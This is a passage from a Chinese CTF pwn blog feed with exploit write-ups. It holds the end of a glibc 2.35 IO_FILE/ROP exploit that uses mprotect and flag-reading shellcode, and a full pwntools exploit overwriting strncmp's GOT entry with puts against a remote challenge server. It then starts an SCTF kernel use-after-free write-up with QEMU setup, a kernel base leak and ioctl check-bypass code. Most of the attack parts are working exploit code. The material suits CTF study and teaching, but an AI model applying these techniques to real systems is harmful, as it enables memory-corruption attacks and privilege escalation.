class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x20</span>) <span class="comment"># chunk + 0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(orw_addr) <span class="comment"># chunk + 0x48</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(_lock)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(fake_io_addr + <span class="number">0xe0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(_IO_wfile_jumps)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">0x14</span> + p64(fake_io_addr + <span class="number">0x120</span> + <span class="number">0x70</span> + <span class="number">0xa0</span> - <span class="number">0x68</span>) <span class="comment"># chunk + 0xe0</span></span><br><span class="line"><span class="comment"># payload += p64(0)*0x14 + p64(0xdeaddead) # fake_io_addr = this.addr - 0xe0 - 0xe0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">0xd</span> + p64(key_gadget)</span><br><span class="line"><span class="comment"># ----------------------------</span></span><br><span class="line">pop_rdx_pop_r12_ret = base + <span class="number">0x11f2e7</span></span><br><span class="line">pop_rdi = base + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = base + <span class="number">0x2be51</span></span><br><span class="line">jmp_rsi = base + <span class="number">0x519d1</span></span><br><span class="line"><span class="comment"># 0x000000000002a147: jmp rax; </span></span><br><span class="line"><span class="comment"># 0x00000000000379d4: jmp rcx; </span></span><br><span class="line"><span class="comment"># 0x00000000000b131c: jmp rdi; </span></span><br><span class="line"><span class="comment"># 0x000000000003fc7a: jmp rdx; </span></span><br><span class="line"><span class="comment"># 0x00000000000519d1: jmp rsi; </span></span><br><span class="line"><span class="comment"># ----------------------------</span></span><br><span class="line">orw = p64(<span class="number">0</span>)*<span class="number">6</span> + <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">orw += p64(pop_rdx_pop_r12_ret) + p64(<span class="number">0</span>) + p64(orw_addr) <span class="comment"># this.addr = orw_addr</span></span><br><span class="line">orw += p64(pop_rdi) + p64(leave_ret)</span><br><span class="line"><span class="comment"># mprotect</span></span><br><span class="line">orw += p64(pop_rdi) + p64(heapbase)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx_pop_r12_ret) + p64(<span class="number">7</span>) + p64(orw_addr)</span><br><span class="line">orw += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(orw_addr)</span><br><span class="line">orw += p64(pop_rdx_pop_r12_ret) + p64(<span class="number">0x100</span>) + p64(orw_addr + <span class="number">0x100</span>)</span><br><span class="line">orw += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">orw += p64(jmp_rsi)</span><br><span class="line"></span><br><span class="line">payload += orw</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x578</span>)</span><br><span class="line">iolistall = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;iolistall&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>)</span><br><span class="line">add(<span class="number">0x548</span>)</span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* read size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_read</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* write size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_write</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">s(sc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

<h1 id="修改strncmp"><a href="#修改strncmp" class="headerlink" title="修改strncmp"></a>修改strncmp</h1><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefined697deeb3-0b08-4d98-ad5c-e70fda60085a.png"
                      alt="697deeb3-0b08-4d98-ad5c-e70fda60085a"
                ><figcaption>697deeb3-0b08-4d98-ad5c-e70fda60085a</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefined091bdb1e-e0a7-4015-9e01-e35ecf33c161.png"
                      alt="091bdb1e-e0a7-4015-9e01-e35ecf33c161"
                ><figcaption>091bdb1e-e0a7-4015-9e01-e35ecf33c161</figcaption></figure></p>
<p>调用putenv的时候会调用strncmp，程序中有一个任意地址写不过有限制，可以改gotplt表，改strncmp为puts可以输出环境变量</p>
<p>exp：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import ctypes</span><br><span class="line">from struct import pack</span><br><span class="line">import numpy as np</span><br><span class="line">from ctypes import *</span><br><span class="line">from math import log</span><br><span class="line">import warnings</span><br><span class="line">banary = &quot;./pwn_pe&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc-2.35.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.27.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/64bit/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.27.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/libc/32bit/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;)</span><br><span class="line"># warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)</span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def debug(a=&#x27;&#x27;):</span><br><span class="line">    if a != &#x27;&#x27;:</span><br><span class="line">        gdb.attach(io, a)</span><br><span class="line">        pause()</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(io)</span><br><span class="line">        pause()</span><br><span class="line">def cal(x, y):</span><br><span class="line">    return ((x - y) + 0x10000) % 0x10000</span><br><span class="line">def get_sb():</span><br><span class="line">    return base + libc.sym[&#x27;system&#x27;], base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">#----------------------------------------------------------------</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">rud = lambda text: io.recvuntil(text, drop=True)</span><br><span class="line">rl = lambda : io.recvline()</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(6),16)</span><br><span class="line">uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line">lss = lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))</span><br><span class="line">p = lambda s: print(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))</span><br><span class="line">#----------------------------------------------------------------</span><br><span class="line">url = &#x27;47.94.231.2 28743&#x27;</span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">    #io = process(banary, env=&#123;LD_LIBRARY:&#x27;./libc.so&#x27;&#125;)</span><br><span class="line">    #io = process(banary,stdin=PTY,raw=False)</span><br><span class="line">else:</span><br><span class="line">    io = remote(*url.replace(&#x27;:&#x27;, &#x27; &#x27;).split())</span><br><span class="line">#----------------------------------------------------------------</span><br><span class="line">script = &#x27;&#x27;&#x27;</span><br><span class="line">    b *$rebase(0x1D7B)\n</span><br><span class="line">    b *$rebase(0x1D23)\n</span><br><span class="line">    b *$rebase(0x1D46)\n</span><br><span class="line">    b *$rebase(0x1E5F)\n</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"># gdb.attach(io, script)</span><br><span class="line">def menu(num):</span><br><span class="line">    sla(&quot;Enter your choice: \n&quot;, str(num))</span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    sla(&quot;Enter your commodity size \n&quot;, str(size))</span><br><span class="line">def edit(idx, data):</span><br><span class="line">    menu(3)</span><br><span class="line">    sla(&quot;Enter which to edit: \n&quot;, str(idx))</span><br><span class="line">    sa(&quot;Input the content \n&quot;, data)</span><br><span class="line">def show(idx):</span><br><span class="line">    menu(4)</span><br><span class="line">    sla(&quot;Enter which to show: \n&quot;, str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    sla(&quot;Enter which to delete: \n&quot;, str(idx))</span><br><span class="line">def secret(num):</span><br><span class="line">    menu(5)</span><br><span class="line">    sla(&quot;Maybe you will be sad !\n&quot;, str(num))</span><br><span class="line">def gift(addr):</span><br><span class="line">    menu(6)</span><br><span class="line">    sa(&quot;Input your target addr \n&quot;, addr)</span><br><span class="line"></span><br><span class="line"># ----------------------------------------------------------------</span><br><span class="line">add(0x528)</span><br><span class="line">add(0x518)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">add(0x548)</span><br><span class="line">show(1)</span><br><span class="line">ru(&quot;The content is here \n&quot;)</span><br><span class="line">base = uheap() - 0x21b110</span><br><span class="line">io.recv(10)</span><br><span class="line">heap1addr = uheap()</span><br><span class="line">p(&#x27;base&#x27;)</span><br><span class="line">p(&#x27;heap1addr&#x27;)</span><br><span class="line">libc.address = base</span><br><span class="line">environ = libc.sym[&#x27;environ&#x27;]</span><br><span class="line">p(&#x27;environ&#x27;)</span><br><span class="line">strncmp_plt = 0x21a118</span><br><span class="line">j_strncmp = base + strncmp_plt</span><br><span class="line">puts = libc.sym[&#x27;puts&#x27;]</span><br><span class="line">p(&#x27;j_strncmp&#x27;)</span><br><span class="line">p(&#x27;puts&#x27;)</span><br><span class="line">menu(6)</span><br><span class="line">ru(&quot;Input your target addr \n&quot;)</span><br><span class="line">key = base+0x21aaa1+0x1afff</span><br><span class="line">p(&#x27;key&#x27;)</span><br><span class="line">s(p64(j_strncmp))</span><br><span class="line">sleep(0.1)</span><br><span class="line">s(p64(puts))</span><br><span class="line">secret(2)</span><br><span class="line"></span><br><span class="line"># debug()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Pwn</category>
        <category>WriteUPs</category>
        <category>QWB</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>WriteUPs</tag>
        <tag>QWB</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF-kno_puts_revenge详解</title>
    <url>/posts/SCTF-kno_puts_revenge.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次SCTF刚好出了两道关于内核UAF的题目，本文写的是kno_puts revenge；</p>
<details class="pink" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>参考文章： 点击查看 </summary>
              <div class='content'>
              <div class="note p-4 mb-4 rounded-small fa-solid icon-padding">  <i class="note-icon fa-solid fa-link"></i><p><a class="link"   href="https://pzhxbz.cn/?p=153#tty_struct" >tty_struct<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div> <div class="note p-4 mb-4 rounded-small fa-solid icon-padding">  <i class="note-icon fa-solid fa-link"></i><p><a class="link"   href="https://blog.csdn.net/seaaseesa/article/details/104650794" >linux kernel pwn学习之条件竞争(二)userfaultfd_kernel pwn userfaultfd-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div> <div class="note p-4 mb-4 rounded-small fa-solid icon-padding">  <i class="note-icon fa-solid fa-link"></i><p><a class="link"   href="https://blog.csdn.net/m0_67392010/article/details/123494717?ops_request_misc=%7B%22request_id%22:%220148AA15-A1DA-4129-904B-A06CBF8D4E6F%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=0148AA15-A1DA-4129-904B-A06CBF8D4E6F&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-123494717-null-null.142%5Ev100%5Epc_search_result_base5&utm_term=userfaultfd&spm=1018.2226.3001.4187" >Linux内核机制总结内存管理之用户页错误文件描述符(二十八)_userfaultfd-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div> 
              </div>
            </details>


  <div class="note p-4 mb-4 rounded-small primary">
    <p>本文将以从拿到题目后的每一步流程写起，相关的知识点部分会在遇到该知识点时进行讲解；</p>

  </div>

<h1 id="做题准备"><a href="#做题准备" class="headerlink" title="做题准备"></a>做题准备</h1><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step.1"></a>Step.1</h2><p>熟悉题目中给的文件；</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241009160624270.png"
                      alt="image-20241009160624270"
                ><figcaption>image-20241009160624270</figcaption></figure></p>
<p>在解压题目之后是有三个文件，分别为：</p>
<ul>
<li>**boot.sh：**qemu虚拟机启动文件；</li>
<li><strong>bzImage：</strong><code>big zImage</code>，是vmlinux经过压缩后的文件。</li>
<li>**roottfs.cpio：**打包好的文件系统。</li>
</ul>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step.2"></a>Step.2</h2><p>对每个文件进行预处理</p>
<h3 id="修改boot-sh"><a href="#修改boot-sh" class="headerlink" title="修改boot.sh"></a>修改boot.sh</h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append &quot;console=ttyS0 kaslr quiet panic=1&quot; \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure></div>

<p>我们为了方便调试会修改参数，比如关闭kaslr，以及加上-s参数以便调试；</p>
<p>修改后：</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append &quot;console=ttyS0 nokaslr quiet panic=1&quot; \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>

<h3 id="提取vmlinux"><a href="#提取vmlinux" class="headerlink" title="提取vmlinux"></a>提取vmlinux</h3><p>使用工具：<code>vmlinux-to-elf</code></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vmlinux-to-elf bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></div>

<h3 id="提取可用gadget"><a href="#提取可用gadget" class="headerlink" title="提取可用gadget"></a>提取可用gadget</h3><p>使用工具：<code>ropper</code></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ropper -f ./vmlinux --nocolor &gt; gadget.txt</span><br></pre></td></tr></table></figure></div>

<h3 id="解包文件系统"><a href="#解包文件系统" class="headerlink" title="解包文件系统"></a>解包文件系统</h3><p>该文件系统可以直接双击提取</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241009162538818.png"
                      alt="image-20241009162538818"
                ><figcaption>image-20241009162538818</figcaption></figure></p>
<p>然后修改init文件内容</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">[ -d /dev ] || mkdir -m 0755 /dev</span><br><span class="line">[ -d /sys ] || mkdir /sys</span><br><span class="line">[ -d /proc ] || mkdir /proc</span><br><span class="line">[ -d /tmp ] || mkdir /tmp</span><br><span class="line">[ -d /etc ] || mkdir /etc</span><br><span class="line"></span><br><span class="line">mount -t proc -o nodev,noexec,nosuid proc /proc</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mkdir -p /var/lock</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || true</span><br><span class="line"></span><br><span class="line">ln -sf /proc/mounts /etc/mtab</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line">echo 1 &gt; /proc/sys/vm/unprivileged_userfaultfd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mdev -s</span><br><span class="line">chown 0:1000 /dev/console</span><br><span class="line">chown 0:1000 /dev/ptmx</span><br><span class="line">chown 0:1000 /dev/tty</span><br><span class="line"></span><br><span class="line">chmod 400 flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">insmod /test.ko</span><br><span class="line">mknod -m 666 /dev/ksctf c `grep ksctf /proc/devices | awk &#x27;&#123;print $1;&#125;&#x27;` 0</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>

<p>修改用户为root，并且每次启动都输出一次驱动加载地址</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">[ -d /dev ] || mkdir -m 0755 /dev</span><br><span class="line">[ -d /sys ] || mkdir /sys</span><br><span class="line">[ -d /proc ] || mkdir /proc</span><br><span class="line">[ -d /tmp ] || mkdir /tmp</span><br><span class="line">[ -d /etc ] || mkdir /etc</span><br><span class="line"></span><br><span class="line">mount -t proc -o nodev,noexec,nosuid proc /proc</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mkdir -p /var/lock</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || true</span><br><span class="line"></span><br><span class="line">ln -sf /proc/mounts /etc/mtab</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line">echo 1 &gt; /proc/sys/vm/unprivileged_userfaultfd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mdev -s</span><br><span class="line">chown 0:1000 /dev/console</span><br><span class="line">chown 0:1000 /dev/ptmx</span><br><span class="line">chown 0:1000 /dev/tty</span><br><span class="line"></span><br><span class="line">chmod 400 flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">insmod /test.ko</span><br><span class="line">mknod -m 666 /dev/ksctf c `grep ksctf /proc/devices | awk &#x27;&#123;print $1;&#125;&#x27;` 0</span><br><span class="line">cat /sys/module/test/sections/.text</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>

<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step.3"></a>Step.3</h2><p>静态分析驱动文件；</p>
<h3 id="my-module-ioctl"><a href="#my-module-ioctl" class="headerlink" title="my_module_ioctl"></a>my_module_ioctl</h3><p>我将此处分为三部分，分别为检查和两个功能</p>
<h4 id="检查部分："><a href="#检查部分：" class="headerlink" title="检查部分："></a>检查部分：</h4><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241009163418992.png"
                      alt="image-20241009163418992"
                ><figcaption>image-20241009163418992</figcaption></figure></p>
<p>此处需要我们输入password，但是这个password是随机生成的；</p>
<h4 id="申请堆块："><a href="#申请堆块：" class="headerlink" title="申请堆块："></a>申请堆块：</h4><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241009163543219.png"
                      alt="image-20241009163543219"
                ><figcaption>image-20241009163543219</figcaption></figure></p>
<p>当操作码为<code>0xFFF0</code>时，会申请一个0x2E0大小的堆块，并且将该地址传给用户态；</p>
<h4 id="释放堆块："><a href="#释放堆块：" class="headerlink" title="释放堆块："></a>释放堆块：</h4><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241009163703391.png"
                      alt="image-20241009163703391"
                ><figcaption>image-20241009163703391</figcaption></figure></p>
<p>当操作码为<code>0xFFF1</code>时，会释放该堆块，但是只有一次机会。</p>
<h3 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241009164119132.png"
                      alt="image-20241009164119132"
                ><figcaption>image-20241009164119132</figcaption></figure></p>
<p>从用户态往堆块中写入数据。</p>
<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step.4"></a>Step.4</h2><p>首先我们需要构建一个做题思路，如何去利用漏洞，看了一整个驱动的伪代码，我想到了<code>CISCN2017-babydriver</code>这道题，利用条件竞争，在新进程的结构体申请时会申请到之前的悬空堆块指针，这道题申请的大小为0x2E0，所以我们根据一些可利用的结构体的大小找到这道题我们应该是使用<code>tty_struct</code>，然后就是利用条件竞争。</p>
<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step.5"></a>Step.5</h2><p>泄露<code>kernel_base</code>，内核5.4，这里我使用的是泄露<code>sys/kernel/notes</code>的内容，然后计算<code>kernel_base</code>；</p>
<p>在调试的时候找到<code>kernel base</code>为：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241014164211750.png"
                      alt="image-20241014164211750"
                ><figcaption>image-20241014164211750</figcaption></figure></p>
<p>首先可以看下<code>notes</code>里面的内容，发现是有一些地址可以利用的：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> notes = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">read(notes, tmp, <span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tmp[0x%x] = 0x%llx\n&quot;</span>, i, *(<span class="type">long</span>*)(&amp;tmp[i]));<span class="comment">//一次性读取 8 个字节的数据，并作为一个整体打印出来</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241014164306927.png"
                      alt="image-20241014164306927"
                ><figcaption>image-20241014164306927</figcaption></figure></p>
<p>也就是说我们泄露出的<code>tmp[0x9c]</code>位置存放的这个地址减去0x2000就是<code>kernel base</code>；</p>
<h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step.6"></a>Step.6</h2><p>绕过检查</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241014170241863.png"
                      alt="image-20241014170241863"
                ><figcaption>image-20241014170241863</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241014170554324.png"
                      alt="image-20241014170554324"
                ><figcaption>image-20241014170554324</figcaption></figure></p>
<p>有以下几个部分：</p>
<ul>
<li>用户态输入在v12；</li>
<li>我们设置checkebuf为0x30大小；</li>
<li>那么<code>checkebuf[0x20]</code>即为<code>v13</code>，也就是<code>v11</code>，我们需要令<code>v11</code>为1，所以<code>checkbuf[0x20] = 1;</code></li>
<li>接着我们申请堆块的时候内核态会把堆块地址传给用户态，也就是v6的位置；</li>
<li>所以设置<code>\*(long\*)&amp;checkbuf[0x28] = (long)data;</code>，利用data存储地址以便后边rop等各种使用；</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">checkbuf[<span class="number">0x20</span>] = <span class="number">1</span>;</span><br><span class="line">*(<span class="type">long</span>*)&amp;checkbuf[<span class="number">0x28</span>] = (<span class="type">long</span>)data;</span><br><span class="line">ioctl(fd, <span class="number">0xFFF0</span>, checkbuf);</span><br><span class="line">ptr = *(<span class="type">long</span>*)data;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] checkbuf[0x20]: %d\n&quot;</span>, checkbuf[<span class="number">0x20</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] *(long*)&amp;checkbuf[0x28]: 0x%llx\n&quot;</span>, *(<span class="type">long</span>*)&amp;checkbuf[<span class="number">0x28</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] *(long*)data: 0x%llx\n&quot;</span>, *(<span 